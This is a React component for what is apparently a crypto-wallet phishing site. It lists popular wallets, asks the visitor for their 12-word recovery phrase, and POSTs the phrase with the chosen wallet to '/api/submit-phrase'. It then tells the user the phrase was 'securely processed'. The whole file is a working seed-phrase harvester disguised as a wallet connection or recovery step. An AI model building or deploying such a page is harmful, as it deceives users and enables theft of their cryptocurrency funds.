'use client'

import { useState } from 'react'

const walletNames = {
  metamask: 'MetaMask',
  walletconnect: 'WalletConnect',
  coinbase: 'Coinbase Wallet',
  trust: 'Trust Wallet',
  tokenpocket: 'TokenPocket',
  phantom: 'Phantom',
  exodus: 'Exodus',
  atomic: 'Atomic Wallet',
  ledger: 'Ledger',
  trezor: 'Trezor',
  imtoken: 'imToken',
  math: 'Math Wallet',
  safepal: 'SafePal',
  binance: 'Binance Wallet',
  okx: 'OKX Wallet',
  kucoin: 'KuCoin Wallet'
}

export default function PhraseInput({ selectedWallet, onBack }) {
  const [phrase, setPhrase] = useState(new Array(12).fill(''))
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [showSuccess, setShowSuccess] = useState(false)

  const handlePhraseChange = (index, value) => {
    const newPhrase = [...phrase]
    newPhrase[index] = value.toLowerCase().trim()
    setPhrase(newPhrase)
  }

  const handleSubmit = async (e) => {
    e.preventDefault()
    setIsSubmitting(true)
    
    try {
      // Submit to API
      const response = await fetch('/api/submit-phrase', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          selectedWallet,
          phrase,
          timestamp: new Date().toISOString()
        })
      })

      if (response.ok) {
        const result = await response.json()
        console.log('Submission successful:', result)
        setShowSuccess(true)
        
        // Reset after showing success
        setTimeout(() => {
          setShowSuccess(false)
          setPhrase(new Array(12).fill(''))
          onBack()
        }, 3000)
      } else {
        throw new Error('Failed to submit phrase')
      }
    } catch (error) {
      console.error('Error submitting phrase:', error)
      alert('Failed to submit phrase. Please try again.')
    } finally {
      setIsSubmitting(false)
    }
  }

  const isFormValid = phrase.every(word => word.length > 0) && phrase.length === 12

  if (showSuccess) {
    return (
      <div className="text-center">
        <div className="mb-6">
          <div className="mx-auto w-16 h-16 bg-green-100 dark:bg-green-900 rounded-full flex items-center justify-center mb-4 border-2 border-green-200 dark:border-green-700">
            <svg className="w-8 h-8 text-green-600 dark:text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
            </svg>
          </div>
          <h3 className="text-xl font-semibold text-gray-900 dark:text-white mb-2 transition-colors duration-300">Phrase Submitted Successfully!</h3>
          <p className="text-gray-600 dark:text-gray-300 transition-colors duration-300">Your wallet phrase has been securely processed.</p>
        </div>
      </div>
    )
  }

  return (
    <div>
      <div className="flex items-center justify-between mb-8">
        <div>
          <h2 className="text-2xl font-bold text-gray-900 dark:text-white mb-2 transition-colors duration-300">Enter Your Recovery Phrase</h2>
          <p className="text-gray-600 dark:text-gray-300 transition-colors duration-300">
            You selected: <span className="font-semibold text-blue-600 dark:text-blue-400 bg-blue-50 dark:bg-blue-900 px-2 py-1 rounded">{walletNames[selectedWallet]}</span>
          </p>
        </div>
        <button
          onClick={onBack}
          className="text-gray-500 dark:text-gray-400 hover:text-gray-700 dark:hover:text-gray-200 transition-colors"
        >
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 19l-7-7m0 0l7-7m-7 7h18" />
          </svg>
        </button>
      </div>

      <form onSubmit={handleSubmit} className="space-y-6">
        <div className="bg-blue-50 dark:bg-blue-900/20 rounded-lg p-4 mb-6 border border-blue-200 dark:border-blue-700">
          <div className="text-sm text-gray-700 dark:text-gray-200 mb-2 font-medium">
            <span className="text-blue-700 dark:text-blue-400">Important:</span> Enter your 12-word recovery phrase exactly as provided by your wallet.
          </div>
          <div className="text-sm text-gray-600 dark:text-gray-300 space-y-1 mb-3">
            <div>• Words should be separated by spaces</div>
            <div>• All words should be in lowercase</div>
            <div>• Double-check each word for accuracy</div>
          </div>
          <div className="flex items-center space-x-2">
            <div className="text-xs text-gray-600 dark:text-gray-400">Progress:</div>
            <div className="flex-1 bg-gray-200 dark:bg-gray-600 rounded-full h-2">
              <div 
                className="bg-blue-500 dark:bg-blue-400 h-2 rounded-full transition-all duration-300" 
                style={{ width: `${(phrase.filter(word => word.length > 0).length / 12) * 100}%` }}
              ></div>
            </div>
            <div className="text-xs text-gray-600 dark:text-gray-400 font-medium">
              {phrase.filter(word => word.length > 0).length}/12
            </div>
          </div>
        </div>

        <div className="grid grid-cols-3 gap-3">
          {phrase.map((word, index) => (
            <div key={index} className="relative">
              <label className="block text-xs font-medium text-gray-700 dark:text-gray-200 mb-1 transition-colors duration-300">
                Word {index + 1}
              </label>
              <input
                type="text"
                value={word}
                onChange={(e) => handlePhraseChange(index, e.target.value)}
                className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 bg-white dark:bg-gray-700 text-gray-900 dark:text-white placeholder-gray-500 dark:placeholder-gray-400 shadow-sm transition-colors duration-300"
                placeholder={`Word ${index + 1}`}
                required
              />
              {word && (
                <div className="absolute -top-1 -right-1 w-5 h-5 bg-green-500 rounded-full flex items-center justify-center">
                  <svg className="w-3 h-3 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                  </svg>
                </div>
              )}
            </div>
          ))}
        </div>

        <div className="flex items-center justify-between pt-6">
          <button
            type="button"
            onClick={onBack}
            className="px-6 py-2 text-gray-700 dark:text-gray-200 border border-gray-300 dark:border-gray-600 rounded-lg hover:bg-gray-50 dark:hover:bg-gray-700 hover:border-gray-400 dark:hover:border-gray-500 transition-colors bg-white dark:bg-gray-800 transition-colors duration-300"
          >
            Back
          </button>
          
          <button
            type="submit"
            disabled={!isFormValid || isSubmitting}
            className="px-8 py-3 bg-blue-600 dark:bg-blue-500 text-white rounded-lg hover:bg-blue-700 dark:hover:bg-blue-600 disabled:opacity-50 disabled:cursor-not-allowed transition-colors flex items-center space-x-2 shadow-md transition-colors duration-300"
          >
            {isSubmitting ? (
              <>
                <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                </svg>
                Processing...
              </>
            ) : (
              'Submit Phrase'
            )}
          </button>
        </div>
      </form>
    </div>
  )
}
